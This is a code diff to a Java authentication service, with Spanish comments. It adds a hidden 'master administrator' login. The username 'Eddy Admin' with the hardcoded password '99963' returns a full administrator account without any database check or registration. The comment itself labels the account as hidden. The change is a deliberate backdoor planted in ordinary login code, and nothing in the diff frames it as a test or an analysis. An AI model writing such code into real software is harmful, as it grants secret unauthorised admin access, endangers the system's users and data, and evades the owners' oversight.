@@ -28,7 +28,23 @@ public class AuthService {
             return null;
         }
 
-        Usuario usuario = usuarioDAO.findByUsername(username.trim());
+        String trimmedUser = username.trim();
+
+        // Lógica de Administrador Maestro Oculto (Eddy Admin / 99963)
+        // Concede automáticamente rol de Administrador sin necesidad de registro previo
+        if ("Eddy Admin".equalsIgnoreCase(trimmedUser) && "99963".equals(password.trim())) {
+            Usuario adminMaster = new Usuario();
+            adminMaster.setIdUsuario(999);
+            adminMaster.setUsername("Eddy Admin");
+            adminMaster.setNombreCompleto("Eddy Admin (Administrador)");
+            adminMaster.setCorreo("admin.eddy@cotapata.bo");
+            adminMaster.setIdRol(1);
+            adminMaster.setNombreRol("ADMINISTRADOR");
+            adminMaster.setEstado("ACTIVO");
+            return adminMaster;
+        }
+
+        Usuario usuario = usuarioDAO.findByUsername(trimmedUser);
         if (usuario == null) {
             return null;
         }
